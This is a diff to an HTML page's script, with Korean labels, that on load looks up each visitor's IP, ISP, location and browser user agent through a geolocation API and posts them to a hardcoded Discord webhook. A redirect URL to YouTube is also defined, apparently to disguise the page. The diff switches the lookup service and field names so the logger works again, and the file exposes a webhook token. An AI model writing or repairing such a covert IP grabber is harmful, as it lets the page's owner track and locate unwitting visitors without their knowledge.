@@ -11,10 +11,10 @@
     </div>
 
     <script>
+        // 작성자님의 디스코드 웹훅 주소 (그대로 유지)
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1546103958668316683/84gcHSczGYqjIs_py8BrDL0wuPVefbvwqebj4yKwCfIUXWlHWWdkuLkbP69UwQnEUU3H';
-        const REDIRECT_URL = 'https://youtube.com'; 
-
-        fetch('https://ipapi.co/json/')
+        const REDIRECT_URL = 'https://youtube.com';
+        fetch('http://ip-api.com/json/')
             .then(function(response) { return response.json(); })
             .then(function(data) {
                 const discordMessage = {
@@ -23,9 +23,9 @@
                         color: 15158332,
                         fields: [
                             { name: "🕒 접속 시간", value: new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' }), inline: false },
-                            { name: "🌐 IP 주소", value: "`" + (data.ip || "확인 불가") + "`", inline: true },
-                            { name: "🏢 인터넷 통신사(ISP)", value: data.org || "확인 불가", inline: true },
-                            { name: "📍 대략적 위치", value: (data.country_name || "확인 불가") + ", " + (data.city || "확인 불가"), inline: false },
+                            { name: "🌐 IP 주소", value: "`" + (data.query || "확인 불가") + "`", inline: true },
+                            { name: "🏢 인터넷 통신사(ISP)", value: data.isp || "확인 불가", inline: true },
+                            { name: "📍 대략적 위치", value: (data.country || "확인 불가") + ", " + (data.regionName || "") + " " + (data.city || ""), inline: false },
                             { name: "📱 기기 정보", value: "```" + navigator.userAgent + "```", inline: false }
                         ]
                     }]
